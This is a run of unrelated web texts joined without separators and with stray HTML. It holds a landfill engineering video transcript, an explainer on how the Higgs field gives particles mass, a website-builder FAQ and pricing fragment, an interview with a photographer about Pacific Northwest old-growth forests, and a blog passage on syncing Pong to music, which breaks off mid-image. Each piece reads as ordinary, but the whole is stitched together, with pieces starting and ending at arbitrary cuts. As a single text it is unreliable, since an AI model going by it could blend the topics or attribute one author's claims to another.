have a scale model of a landfill in the garage to show you how it all works. I’m Grady, and this is Practical Engineering.</p><p>There are lots of kinds of waste in this crazy world, but one of the biggest sources is just you and me throwing stuff in the trash. The technical term is municipal solid waste, since its collection is usually coordinated at the city level. There are a lot of ways to manage it once collected, but the most common by far is disposal in a landfill. And, one of the biggest parts of landfill engineering is just deciding where to put one in the first place. The main goal of a landfill is to maximize the volume of waste that can be stored there while minimizing the cost and the environmental impacts too, which turns choosing a suitable site into a giant geometry problem. </p><p>Digging a hole sounds like an obvious choice, but consider this: digging a hole is expensive, and not digging a hole is free. There are costs of excavating tons and tons of soil just to get it out of the way so it can be replaced with trash and costs of hauling away all that soil (since your goal is to maximize the volume on the site). Plus, you have to avoid the water table, any unsuitable geology, and the challenges of building and working deep below the surface of the earth. That’s why most landfills mostly build up into what sanitation professionals call the “air space.” Looking upward, it may seem like the sky is the limit, but anyone who’s built a tower of anything, let alone trash, knows better. The waste pile gets less stable as its height increases, requiring shallower slopes. And the pressures at the bottom go up too, which can lead to settlement and damage of facilities. Plus, there are visual impacts. The bigger the garbage heap, the bigger the eyesore, and people are only willing to look at a landfill so tall. </p><p>They can’t be too close to airports, because they attract birds that can interfere with planes. And they can’t be too close to homes, parks, playgrounds, and other places people congregate for obvious reasons. Of course, there’s floodplains and wildlife habitat to avoid as well. And you don’t just need a place to put the trash. You also need a scale house to weigh the trucks coming in and out, a shop and storage for the equipment, and sometimes a place for ordinary citizens to drop stuff off. Finally, you need a spot that can handle the huge increase in truck traffic coming and going, practically nonstop. Pretty much, if you can get a college degree in it, it’s going to come into play when siting a landfill: geology, geography, politics, archaeology, public relations, biology, every kind of engineering, and lot more.</p><p>But once you have your landfill, you can’t just start dumping trash. Let me show you why with a demonstration with some help from my shop assistants. I have my hole dug, and we’ll start adding some trash. So far, no major problems. But eventually, it’s going to rain. And you can’t immediately see the issue. Granted, this is more of a flood than a drizzle, but it gets the point across. All that water is going to filter through the garbage to the bottom of the hole, and, eventually, into the underlying soil. It might go without saying, but I’m going to say it anyway: We really don’t want garbage juice percolating into our soils. Mainly because it can contaminate sources of groundwater, but also because it can migrate well beyond the limits of the landfill, causing all sorts of environmental troubles. So, modern landfills use a bottom liner to keep waste separate from the underlying soils. Often this consists of a thick sheet of plastic, carefully tested and welded together into an impermeable membrane. Even the area between the plastic welds is tested using air pressure to make sure there are no leaks. Another option is thick clay soil compacted to create a watertight layer. In many cases, the two options are combined, so you end up with this intricate structure of different impermeable layers stacked together.</p><p>Maybe you still see a problem with this solution on its own. Now when it rains, the landfill just fills up with water. This causes issues with stability and settlement. It causes garbage to decompose more quickly, leading to odor and temperature problems. Plus, you just can’t work on top. There’s no way for trucks to unload trash on top of a garbage swamp. So we need a way to get the garbage juice out, without letting it flow into the soil below. By the way, garbage juice isn’t a technical term. It’s actually called leachate, so I’ll use that from here on out. And all modern landfills have sophisticated leachate collection systems to keep the waste as dry as possible and avoid the issues I mentioned. Usually, this consists of a system of perforated pipes covered in a layer of sand, draining to sumps, and eventually leading out of the waste.</p><p>I built a little leachate collection system in my model landfill using a small tube so you can see this in action. Now my clay bathtub has a drain. When the rain comes, the water that makes its way into the waste is able to flow out of the landfill, keeping it from becoming a swampy mess. This is a little simplified compared to a real landfill. I’ve made a video all about French Drains, which is much closer to what a leachate collection system consists of if you want to learn more after this. Obviously, in my example, the leachate system has to penetrate the bottom liner, which can be a potential source of leaks. So these penetrations are sealed really carefully in the real world, or the collection system just uses pumps and risers that run up the slope of the landfill to the top, so no penetration system is necessary.</p><p>Of course, now you have a stream of leachate you have to deal with. Actually, leachate management is one of the biggest costs of running a facility like this. Some landfills send it off to a treatment plant that can clean it up. Some have ways to treat it on-site with settling ponds, evaporation, biological treatment, and even plants that can consume and convert landfill leachate into waste that’s easier to dispose of (maybe even back into the landfill itself).</p><p>Finally, the bottom of our landfill has all the necessary pieces, but the work doesn’t stop there. Remember that volume is everything in a landfill. For as much effort goes into finding a location and building the infrastructure, it’s essential that we get the most trash in here as possible. You probably know this, but municipal garbage just isn’t that dense. Maybe you’ve had to smash a few more bags in the can because you missed the collection one week. If so, you know there’s usually a lot of room for densification. The trucks that collect garbage usually have a way to compact it to make more room in the box before needing to be emptied. But once the trash is at the landfill, there’s still an opportunity for compaction. Landfills often use massive roller compactors with enormous teeth and giant blades to grade out and compress waste and get as much as possible into the site. It saves money, and it’s good stewardship of the space. But density isn’t the only challenge with day-to-day operations.</p><p>Despite what you’ve heard, landfills are kind of gross. I mean, that’s their whole point is to accept the stuff we don’t want to put anywhere else. But putting it all in one place creates a lot of problems: pests, odors, windblown waste, fires, birds, and more. So to mitigate some of that, most places require that the garbage be covered up at the end of every day. This “daily cover” can take a lot of forms. The basic approach is just to put a layer of soil over the top of the working face at the end of the day. </p><p>When I do this in my model, you get a sense of the problem. All that clean daily cover is taking up precious space in the landfill. One option is to trim it back off each morning before trucks start arriving, but that’s a sisyphean task of just moving tons and tons of soil around each day. Other alternatives for daily cover are tarps, or just holding back certain types of waste that are more inert like foundry sand, foam, paper, and shredded tires. They’re going in anyway, so you might as well use them on top to cover the more disagreeable stuff overnight. Those alternatives can also help avoid leachate getting perched within the waste, encouraging it to continue downward to the collection system.</p><p>Ideally, a landfill will last for decades, slowly filling up by packing as much waste as possible. Throughout the course of operating a landfill, there’s constant testing of groundwater, surface water, leachate, air quality and more to make sure they’re not exceeding limits. Landfills are usually built in smaller cells so you don’t have to manage this huge area of waste all at once. A cell fills up, you put soil over the top (called interim cover), and start a new one within the landfill. But eventually, you reach the top of the airspace, and the landfill reaches the end of its useful life. And closing a landfill is not an easy job. Of course, you have to cover all that waste up, creating a mountainous sealed tomb of garbage. That final cover has to keep water out, to reduce the volume of leachate you’re having to collect and treat over time. But it also has to keep the garbage in, and not just the garbage itself, but anything else that comes with it like smells and leachate and pests. And it has to do it basically forever. So, just like the bottom liner, the final cover over a landfill is usually a system of multiple layers, including compacted soil, membranes, and fabrics. And then you have to get the grass to grow, to protect the soil from erosion and damage over time. I don’t have time to wait for grass to grow in my demo, so I’m cheating a little bit.</p><p>But the fun isn’t quite over yet. The waste may be sealed up, but that doesn’t mean it’s inert. In fact, there’s a lot of chemistry and biology happening inside a landfill, and a lot of those reactions generate gases like methane and hydrogen sulfide that can create pressure, heat, smells, greenhouse effects in the atmosphere, and the potential for explosions. So, one of the steps in landfill closure is to install wells that can collect the gases from the waste. Usually, these consist of vertical pipes connected to a blower that constantly draws air to a collection point. There’s a lot that goes into these systems too. You can’t pull too hard, or you might draw oxygen into the landfill, changing the reactions and microbiological processes, and creating a potential for a fire within the waste. Plus the gas includes a lot of humidity, so managing condensation creates another liquid stream that has to be collected and treated. Once it’s collected, the landfill gas can be flared, combusting it into less environmentally harmful constituents. Another option is to put it to beneficial use to create heat or even electricity. The Puente Hills landfill I showed earlier has a gas-to-energy facility that’s been running since 1987, and even though the landfill is now closed, it currently provides enough electricity to power around 70,000 homes.</p><p>Once a landfill is closed, there’s not a lot you can do with it after that. It’s a big, sealed up, mountain of trash, after all. Owners are generally required to look after a closed landfill for at least 30 years afterwards, inspecting for leaks, monitoring the air and water, and repairing any damage. Those costs have to be built into the rates they charge, since there’s not a lot of benefit (or revenue) after closure. But, with all that open space and carefully-maintained landscaping, one option that many landfill operators are trying out is parks. And I love this idea. They say, “We’re willing to put our money where our mouth is and invite the public to spend time here, to enjoy this place that used to be, you know, one of the least enjoyable places you can imagine.” Puente Hills in California has big plans, including trails on the slopes, biking, slides, gardens and more. It looks like it will be a really nice place to visit when it’s done. And it also puts the whole concept of landfills in perspective.</p><p>Of course, we have a lot of room for improvement in how we think about and manage solid waste in this world. Landfills seem like an environmental blight, but really, properly designed ones play a huge role in making sure waste products don’t end up in our soil or air or water. It’s not possible to landfill waste everywhere. Many places are too densely populated or just don’t have enough space. But where they are, the environmental impacts are relatively small. Just consider the resources that go into them. I pay about 20 dollars a month, probably a little on the low end of the national average, and that buys me 64 gallons (about a quarter of a cubic meter) of space in a municipal landfill per week. Of course, I don’t fill the can every week, and that trash gets compacted. But still, do that for a decade, and your 20 bucks a month has paid for the volume of a modest apartment. It’s covered the cost of building the lining and collection systems, the environmental monitoring, the daily operations, the closure, the gas collection, and the maintenance for at least three decades afterwards and for your trash to stay there effectively forever. It’s (almost) free real estate, not that you’d want to live there. But my point is: landfills are a surprisingly low-impact way to manage solid waste in a lot of cases. I hope the future is a utopia where all the stuff we make maintains its beneficial value forever, but for now, I am thankful for the sanitary engineers and the other professions involved in safely and economically dealing with our trash so we don’t have to.</p>

<div id="readability-page-1" class="page"><div data-role="selectable">
    <p>The discovery of the Higgs boson at the Large Hadron Collider in 2012 confirmed what we particle physicists had long suspected: that there is a field permeating the cosmos that generates the masses of elementary particles. Unfortunately, physicists have found it challenging to explain to everyone else how this so-called Higgs field accomplishes its mighty task.</p>
<p>A common approach has been to tell a tall tale. Here’s one version:</p>
<blockquote><p><em>There’s this substance, like a soup, that fills the universe; that’s the Higgs field. As particles move through it, the soup slows them down, and that’s how particles get mass.&nbsp; </em></p></blockquote>
<p>Other versions portray the Higgs field as akin to molasses, a thicket, a crowd of people or an expanse of snow.</p>
<p>However, all such stories conflict with what we physicists teach in the very first weeks of first-year university courses. By suggesting that the Higgs field creates mass by exerting drag, they violate both Newton’s first and second laws of motion. Among other disasters, this drag would long ago have caused the Earth to spiral into the Sun. Moreover, if the Higgs field were really a substance, it would provide a point of comparison against which we could measure our absolute motion, violating both Galileo’s and Einstein’s principles of relativity.</p>
<p>In truth, the Higgs field has nothing to do with motion or slowing. Instead, its story is all about vibration.</p>
<p>Quantum field theory, the powerful framework of modern particle physics, says the universe is filled with fields. Examples include the electromagnetic field, the gravitational field and the Higgs field itself. For each field, there’s a corresponding type of particle, best understood as a little ripple in that field. The electromagnetic field’s ripples are light waves, and its gentlest ripples are the particles of light, which we call photons. Similarly, electrons are ripples in the electron field, and the Higgs boson is a minimal ripple in the Higgs field.</p>

<p>A stationary electron, much like the vibration of a guitar string, is a standing wave that vibrates with a preferred frequency, known as its resonant frequency. Such resonant vibration is common and familiar. Because a plucked guitar string consistently rings at its resonant frequency, it always makes the same tone. Likewise, the fixed frequency of a swinging pendulum is what makes it an effective clock. On the same principle, every stationary electron vibrates with the resonant frequency of the electron field.</p>
<p>Most of the universe’s fields have resonant frequencies. In a sense, the cosmos loosely resembles a musical instrument; both have characteristic frequencies at which they most readily vibrate.</p>
<p>For me personally, the fact that resonance lies at the foundation of reality is a source of delight and amazement. As a lifelong amateur musician and composer, I’ve long understood the inner workings of pianos, clarinets and guitars. But I was completely astonished to learn, back when I was a graduate student, that the structures of the universe, even within my own body, operate on similar principles.</p>
<p>Yet this secret musicality of our cosmos would be impossible were it not for the Higgs field.</p>
<p>In quantum field theory, a combination of quantum physics and Einstein’s relativity leads to a crucial relationship between a resonant frequency and the mass of an elementary particle: The more rapidly a stationary particle vibrates, the greater its mass. Fields lacking a resonant frequency correspond to particles that have no mass; such particles, including the photons of the electromagnetic field, can never be stationary.</p>
<p>While the Higgs tall tales suggest that mass arises from the slowing of elementary particles by a molasses-like substance, the truth is that a stronger Higgs field makes the elementary particles vibrate at higher frequencies, thus raising their masses. One might therefore view the Higgs field as a sort of cosmic stiffening agent, whose role is to increase the resonant frequencies of other fields.</p>
<p>How is it possible for one field to change the frequency of another? The humble pendulum gives us a simple example.</p>
<p>Imagine placing a ball at the end of a string out in deep space, where the gravitational field is essentially zero. The ball will float aimlessly. If you give it a little push, its position may slowly drift, but it won’t vibrate.</p>
<p>However, if you put the makeshift pendulum in a nonzero gravitational field, everything changes. The ball hangs straight down and, if disturbed, will swing.</p>
<figure>
    <p><img src="https://www.quantamagazine.org/wp-content/uploads/2024/08/Higgs_Explainer-crMarkBelan-Desktop-v1-01.svg" alt="" decoding="async" loading="lazy"><img src="https://www.quantamagazine.org/wp-content/uploads/2024/08/Higgs_Explainer-crMarkBelan-Mobile-v1-02.svg" alt="" decoding="async" loading="lazy">    </p>
            <figcaption>
            <p>Mark Belan for&nbsp;<em>Quanta Magazine</em></p>
        </figcaption>
    </figure>

<p>When stationary, the ball is said to be in equilibrium — stable, balanced and with no reason to move. If the ball is displaced to the right, gravity will cause it to swing back to the left, and vice versa. The tendency of the ball’s position to return to the point of equilibrium, known as a restoring effect, is what causes it to swing.</p>
<p>Here the gravitational field acts as a stiffening agent: It stiffens the pendulum, thereby giving it a nonzero resonant frequency. The stronger the gravitational field, the more powerful the restoring effect and the higher the pendulum’s resonant frequency.</p>
<p>Analogously, the Higgs field creates a restoring effect on other elementary fields that changes the way they vibrate. Although any field can have traveling ripples like those that cross a pond, a restoring effect allows a field to have stationary ripples, the standing waves that resemble those on a guitar string. As I mentioned earlier, these standing waves are nothing more nor less than motionless elementary particles, rippling in their respective fields.</p>
        
        
<p>This notion lies at the heart of what the late British physicist Peter Higgs, namesake of the Higgs field, and his competitors pointed out in the 1960s: that one field can stiffen other fields, thereby permitting their ripples to vibrate in place with a resonant frequency, and thus giving their particles mass. Experimental studies of the Higgs boson at the Large Hadron Collider confirm that this is indeed what the Higgs field does. By using the mathematics of the <a href="https://www.quantamagazine.org/a-new-map-of-the-standard-model-of-particle-physics-20201022/">Standard Model of particle physics</a> — the quantum field theory describing all the known elementary particles and the interactions among the universe’s fields — scientists make predictions for the Higgs boson’s behavior that precisely match experiments. There is no doubt: The Higgs field creates a restoring effect on many other fields.</p>
<p>So with this deeper understanding of the Higgs field, let me suggest a different tale:<em>&nbsp;</em></p>
<blockquote><p><em>Once upon a time, there came into being a universe. Searingly hot, it swarmed with elementary particles. Among its fields was a Higgs field, initially switched off. But as the universe expanded and cooled, the Higgs field suddenly switched on, developing a nonzero strength. When this happened, many fields became stiff, and as a result their particles acquired resonant frequencies and mass. That’s how the universe was transformed, through the influence of the Higgs field, into the quantum musical instrument it is today.</em></p></blockquote>

It's becoming standard to design websites in a design tool, then rebuild it in a website builder. That means duplicate work, learning two tools, design-to-code translation... it's a pain. But existing website builders are miles behind the UX of Figma, and Figma can't make real websites. If it was all in one tool, it would be SO much easier. That's the concept behind Repaint. It's a design tool for real code.</p></div><div id="e_1456"><p id="e_1457">How does Repaint handle responsiveness?</p><p id="e_1458">First you design your website for desktop. Then you make adjustments on different breakpoints. In design terms, Repaint uses autolayout and breakpoints. In code terms, we use flexbox and media queries. We've closely followed html and css. We even have responsive units. If you're unfamiliar with responsive design, our template library has lots of examples.</p></div><div id="e_1453"><p id="e_1454">Can I import from Figma?</p><p id="e_1455">We don't support importing designs from Figma. We've thought about it. We've heard a lot of horror stories about export plugins. At best, its low on our todo list. But if you're familiar with Figma, Repaint will probably be easier than other tools, even if they have a plugin.</p></div><div id="e_1459"><p id="e_1460">Is this made for beginners or professionals web designers?</p><p id="e_1461">Repaint is made for a range of semi-technical people: designers, developers, founders... It's definitely more technical  than the average person off the street. But you don't have to be a full-time web dev.</p></div></div></div><div id="e_1126"><div id="e_1129"><p id="e_1127">Pricing</p><p id="e_1128">Get started for free, pay to host on your own domain.</p></div><div id="e_1412"><div id="e_1131"><div id="e_1169"><div id="e_1134"><p id="e_1132">Individual</p><p id="e_1133">For a personal websites and trying the app</p></div><div id="e_1145"><div id="e_1148"><p><img id="e_1146" src="https://s3.us-east-2.amazonaws.com/prod-repaint-public-site-files/d12a06e4-a523-417c-aa25-9494806295a7/452ea0df-8be5-4a44-9f2c-821029eb7fd2"></p><p id="e_1147">Full Editor Access</p></div><div id="e_1141"><p><img id="e_1139" src="https://s3.us-east-2.amazonaws.com/prod-repaint-public-site-files/d12a06e4-a523-417c-aa25-9494806295a7/452ea0df-8be5-4a44-9f2c-821029eb7fd2"></p><p id="e_1140">Publish up to 3 pages</p></div><div id="e_1144"><p><img id="e_1142" src="https://s3.us-east-2.amazonaws.com/prod-repaint-public-site-files/d12a06e4-a523-417c-aa25-9494806295a7/452ea0df-8be5-4a44-9f2c-821029eb7fd2"></p><p id="e_1143">Publish on a Repaint domain</p></div></div></div><a href="https://app.repaint.com/signup"><p id="e_1474">Get Started</p></a></div><div id="e_1149"><div id="e_1174"><div id="e_1152"><p id="e_1150">Pro</p><p id="e_1151">For business websites and portfolios</p></div><div id="e_1162"><div id="e_1165"><p><img id="e_1163" src="https://s3.us-east-2.amazonaws.com/prod-repaint-public-site-files/d12a06e4-a523-417c-aa25-9494806295a7/452ea0df-8be5-4a44-9f2c-821029eb7fd2"></p><p id="e_1164">Full Editor Access</p></div><div id="e_1159"><p><img id="e_1157" src="https://s3.us-east-2.amazonaws.com/prod-repaint-public-site-files/d12a06e4-a523-417c-aa25-9494806295a7/452ea0df-8be5-4a44-9f2c-821029eb7fd2"></p><p id="e_1158">Publish any number of pages</p></div><div id="e_1161"><p><img id="e_1166" src="https://s3.us-east-2.amazonaws.com/prod-repaint-public-site-files/d12a06e4-a523-417c-aa25-9494806295a7/9706bd21-dabb-4093-a207-f3134d89f369"></p><p id="e_1160">Publish on a custom domain</p></div></div></div><a href="https://app.repaint.com/signup"><p id="e_1402">Get Started</p></a></div></div></div></div></div>]]></description>

   <p>“As humans, our everyday lives are sustained by the behaviors and interactions of forest organisms,” photographer David Herasimtschuk writes of old growth forests. “Yet, because these processes and relationships occur in places and at scales rarely observed, our connection with forest biodiversity and the role it plays in nurturing our well-being often goes completely unnoticed.”</p>   <p>In the last 10 years, Herasimtschuk has photographed forests across the Pacific Northwest, documenting the inhabitants of these last remaining old-growth ecosystems. From salamanders and salmon to bears and mountain lions, his images illustrate not only the beauty of the forests and their creatures but the symbiotic relationships which are vital to the forests’ health and the planet’s welfare.</p>   
   <p>We interviewed Herasimtschuk about his efforts to educate people about the importance of preserving these ancient forests. The interview has been edited for clarity and length.</p>   <div id="resg-s1-5092">

   <p><strong>What motivates you to photograph old-growth forests?</strong></p>   <p>Protecting intact, mature and old-growth forests worldwide has been found to be one of the most immediate and cost-effective solutions to mitigating the impacts of climate change, yet adequate policy to manage these forests for ecosystem health and carbon storage has been limited.</p>   <p>The temperate rainforests of western North America have the highest carbon storage potential of any forest type in the world and are recognized as some of the most valuable ecosystems on the planet. Yet, conflicts over these forests have been ongoing since the 1980s, with the timber industry and conservation community battling over how they are managed.</p>   <p>Celebrating the beauty and importance of these environments, this photo essay is a present-day look at the complex connections we share with these forests. Currently, there are numerous proposed policy initiatives that are focused on creating a new framework for forest health and old-growth protection in the Pacific Northwest. This includes a movement to protect mature forests, which are made up of trees that are 80-150 years old and viewed as comprising the next generations of old-growth forests.</p>   <div id="resg-s1-5093">

   <p>These legislative actions also contain policy to update and rethink how private and state forests are managed in the state of Oregon, as well as work to modernize forest protection on federal lands nationwide. In an effort to advance our country’s climate initiatives, the Biden administration enacted an executive order in 2022 that committed the federal government to protecting the few remaining mature and old-growth forests we have left. In response to that order, the U.S. Forest Service plans to make major revisions to both the National Forest Plan and Northwest Forest Plan this year.</p>   
   <p>With many decisions currently being discussed about the fate of our forests in the Pacific Northwest, it's important that the public and decision-makers understand how healthy forests function, and have the information they need to make science-based decisions in regard to forest management.</p>   <div id="resg-s1-5095">

   <p><strong>How long have you been working on this project?</strong></p>   <p>I have been working, living and exploring in the Pacific Northwest since 2011, and started this old-growth focused project in 2022.</p>   <p><strong>What kinds of images were you hoping to capture with your work?</strong></p>   <p>From the top of the canopy to the waters below, my goal for this project is to create a series of photos that provide an entire ecosystem aesthetic. To do this, I work to create wide-angle images that put a species, or human, in context of the forest or habitat type.</p>   <p>Currently, a large amount of my work focuses on the connections between forests, rivers and fish. In the Pacific Northwest, the relationship between salmon and forests embodies a sense of connection that seems almost mystical. Delivering a pulse of nutrients, returning adult salmon nourish some of the largest trees in the world, and in return, these ancient forests provide a foundation for the complexity of conditions that salmon and other fish rely on. For millions of years, salmon, trout and numerous other aquatic species have adapted to the conditions created by these massive trees. From bank stabilization and water filtration to the creation of cover and spawning habitat, large trees provide a multitude of ecosystem services for aquatic environments.</p>   <div id="resg-s1-5097">

                In the Pacific Northwest, it’s becoming increasingly difficult to experience large salmon runs that are similar to what was seen historically. The forests of the Pacific Northwest have some of the highest carbon storage potential of any forest type in the world. With certain tree species' ability to grow up to three times faster when supported by the nutrients salmon bring to a forest's ecosystem, it's believed that salmon restoration could be an important tool to help increase a forest’s ability to sequester carbon in the region.

   <p>To illustrate these relationships, or to show how these connections have been lost, I work to find opportunities where I can put fish and forests in the same image. This type of image often helps share the story of how forest management plays a critical role in salmon conservation.</p>   <div id="resg-s1-5103">

   <p><strong>What have you learned about the forest’s ecosystem since you’ve started this project?</strong></p>   <p>One of the most important concepts I’ve come to understand while working on this project is that not all forests are equal. How we manage a forest can have huge repercussions that impact numerous species and processes, and can often lead to changes in ecosystem services that humans rely on.</p>   
   <p>Historically, the idea of old-growth forests as important natural systems was not the dominant perspective in our society. These ancient trees were once considered crops and perceived as “biological deserts.” Industrial logging in the 20th century removed most of the old growth, resulting in the younger forests we experience today. While some areas on federal land have been protected, allowing forests to regrow, there have also been large tracts of private land that are now managed for timber, and are cut every 50-80 years to meet the demand for timber.</p>   <div id="resg-s1-5098">

   <p>Over the last 50 years, science has been working to understand how these impacts have changed forest ecosystems in the region. Beyond carbon sequestration, scientists are finding these environments play an important role in a multitude of ecosystem services, including water quantity and quality, and that management decisions can greatly impact these processes.</p>   <p><strong>What have you learned that’s surprised you?&nbsp;</strong></p>   <p>Looking beyond their physical beauty, scientists are discovering that old-growth forests are home to a network of almost unfathomable connections that showcase the importance and complexity of regions biodiversity. One of the greatest examples is the relationship between salmon and trees. Salmon are fundamental to the health of forest ecosystems in the Pacific Northwest. As they return home to spawn and die, they bring with them a large pulse of nutrients that helps drive stream and forest ecosystems. By absorbing the nutrients from decaying fish, researchers have found that salmon actually provide nitrogen to trees, which is a limited nutrient in forest ecosystems. It’s even been discovered that certain tree species can grow up to three times faster when influenced by salmon. As populations of these vital fish continue to decline throughout the Pacific Northwest, scientists worry that trees and forests no longer receive nutrients they need to reach their full ecological potential.</p>   <div id="resg-s1-5099">

   <p>Beyond the salmon and trees, some of the largest surprises in these forests come from some of the smallest species, like salamanders. Due to the cryptic nature of these amphibians, it's hard to grasp their true importance within an ecosystem, but recent research has demonstrated that these amphibians play an important role in the global carbon cycle.</p>   
   <p>In Northern California, scientists have revealed that, by hunting and preying on insects that spend their lives ripping, shredding and feeding on leaves — a behavior that actually releases carbon dioxide into the atmosphere — salamanders effectively prevent this carbon from entering the atmosphere and allow it to stay locked in leaves and on the forest floor.</p>   <div id="resg-s1-5129">

   <p><strong>What is your process for documenting the wildlife in the forest? Do you need special equipment?</strong></p>   <p>Working and photographing in old-growth forests definitely comes with a unique set of challenges, and through trial and error, I’ve been able to develop methods that work relatively well in these environments. Documenting these forests from an ecosystem perspective often means I need a wide range of gear. This includes everything from underwater housings and drysuits to document fish, to camera traps to photograph large mammals like bears.</p>   <p>For me, personally, I also really enjoy the process and exploration that goes into the creation of each photograph. For each image, this often results in many miles hiked, and snorkeled, to learn the best locations and approaches to photograph different species. Most days aren’t a great success, photographically speaking, but I love being in the forest, and with each outing, I feel like I learn a little more.</p>   <div id="resg-s1-5128">

   <p><strong>Do you work with scientists studying forest ecosystems? If so, how does that collaboration work?</strong></p>   <p>Working at the confluence of science, conservation and storytelling, I’ve been fortunate to collaborate with many passionate scientists working at the forefront of forest ecology. Much of the imagery created for this project has been guided and inspired by the research and science from H.J. Andrews Experimental Forest, a forest co-managed by the U.S. Forest Service and Oregon State University. Tucked in the Cascade Mountain Range in western Oregon, this long-term ecological research site is one of the most studied old-growth ecosystems on the planet and has laid the foundation for forest science, understanding and policy worldwide.</p>   
   <p>As we move forward in our approach to address climate change, finding engaging and novel ways to communicate science becomes more important than ever. Working closely with the researchers who are uncovering the importance and mysteries of our natural world, this project focuses on creating imagery that sparks curiosity and helps celebrate the interactions and relationships in nature that are difficult to see.</p>   <div id="resg-s1-5127">

                A young black-tailed deer blends in among a pair of decomposing Douglas fir snags in Oregon’s Coast Range. Providing critical habitat for over one hundred species, snags help create locations for nesting, shelter and foraging, and are an incredibly important component to healthy old-growth ecosystems.

   <p><strong>What are some of your favorite images?</strong></p>   <p>I think some of my favorite images so far for this project have been the ones created using camera traps. Communicating the size of old-growth trees is often difficult, so it’s helpful to have a subject in the image to convey scale. Few species symbolize wild environments better than mountain lions and bears, so to be able to create images of these elusive predators as they explore their old-growth habitats is truly special.</p>   <div id="resg-s1-5126">

   <p>Creating a useful image with a camera trap can often take months of work and fine-tuning, and even then, it’s rare to get the shot you hoped for. The cameras sit in the forests for long periods of time, exposed to the elements and curious wildlife. It’s not uncommon to return to a trap to find it has been dismantled by a bear or knocked over from falling trees and branches.</p>   <p>Yet, with a little luck and a lot of persistence, every now and then you create a photo where all the elements come together. These unique photos provide an intimate perspective of these environments that few have ever seen, making them a valuable tool to help teach audiences about the importance of these forests.</p>   <p><strong>What do you want people to come away with after looking at these images?</strong></p>   <p>As the climate and planet continue to change, many people are trying to understand and grasp how the natural world is connected to their everyday lives. So often, the question is asked, what is the value of an individual species? Or what is the value of biodiversity? By creating storytelling imagery that helps audiences recognize the relevance of forest life, my hope is that this project will engage and inform audiences about the importance of old-growth ecosystems in the Pacific Northwest. Bringing to attention the individual species and relationships within ecosystems that play a role in maintaining our planet, my goal is to spark curiosity and wonder, encouraging people to want to learn more.</p>   
   <p>As our demand and impact on forests continues to grow worldwide, I believe images and stories of the environments and species affected will play a critical role in visually connecting forest ecosystems to their would-be stewards. Understanding the importance of biodiversity and how forests function is a critical part in creating that connection.</p>   <div id="resg-s1-5130">

One of my favorites is inspired by the classic arcade game pong. In classic pong a ball bounces off of paddles in a steady rhythm. What if we synchronize the bounces to the beat of a song, making the paddles dance?</p><p>To make this possible we alter the physics of the game so that the ball moves at a constant speed, and paddles can move anywhere on their respective halves of the screen.</p><p>We also retain these rules from the classic game:</p><ul><li><p>The contact point of the ball on the paddle determines its angle of reflection</p></li><li><p>Paddles have no speed limit</p></li><li><p>The ball bounces off the top and bottom of the screen</p></li></ul><p>These physics give us the necessary degrees of freedom to move the paddles to hit the ball at any desired times. </p><p>One simple strategy to satisfy any timing requirements is to keep both paddles close to the center. This gives us little horizontal space, but vertical space is effectively infinite since the ball can bounce off the top and bottom edges of the screen. For any desired shot duration, we can slow the horizontal velocity to match it by hitting the ball more vertically. While this argument shows a solution exists for any input, it certainly isn't exciting to watch.</p><p>What makes a visualization appealing, though? One desirable property is the utilization of screen space; a game stuck in a small region feels cramped and underwhelming. Closely related is dynamism of movement; spectators enjoy watching players make heroic efforts to hit a ball just within reach.</p><p>Unfortunately it's difficult to write an algorithm to maximize screen usage while guaranteeing a valid game. If a paddle hits the ball far from the screen's center, the ball may not have time to cross the screen for the next beat. Any movement of the paddles must account for the potential impact on future moves. This is the crux of the problem: while respecting the beat of the song and the physics of the game, where should the paddles hit the ball on each beat to maximize screen utilization?</p><p>Fortunately there is a mature field dedicated to optimizing an objective (screen utilization) with respect to variables (the locations of bounces) in the presence of constraints on those variables (physics and the beats of the song). If we write our requirements as a constrained optimization problem, we can use an off-the-shelf solver to compute optimal paddle positions instead of designing an algorithm ourselves.</p><p>Formulating the task as a constrained optimization problem has several advantages. If we change the physics we simply need to update our constraints, while an algorithm may need to be rewritten. In a similar vein, it lets us easily experiment with objectives. Developing appealing animations is an iterative process, which the declarative style of constrained optimization facilitates.</p><p>That sounds great, but modeling 2D constraints is hard; is our game truly two-dimensional? It turns out modeling only the horizontal component is sufficient! In our ruleset, the ball moves at a constant speed, so its vertical velocity is exactly determined by its horizontal velocity. By simulating the game we can compute the ball's vertical position at any time.</p><p>Knowing the ball's vertical position also gives us the vertical position of the paddles since it must match the ball's position to hit it (plus a small delta to achieve the desired angle). Between hits, we simply linearly interpolate positions to achieve smooth movement. Thus we only need our solver to compute the horizontal positions and velocities at the times when the paddles hit the ball; the rest follows from the physics of the game.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6b8f138e-464c-4dbe-ad6e-205a514faeeb_616x400.png" data-component-name="Image2ToDOM" rel="nofollow ugc noopener"><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6b8f138e-464c-4dbe-ad6e-205a514faeeb_616x400.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6b8f138e-464c-4dbe-ad6e-205a514faeeb_616x400.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6b8f138e-464c-4dbe-ad6e-205a514faeeb_616x400.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6b8f138e-464c-4dbe-ad6e-205a514faeeb_616x400.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6b8f138e-464c-4dbe-ad6e-205a514faeeb_616x400.png" width="616" height="400" 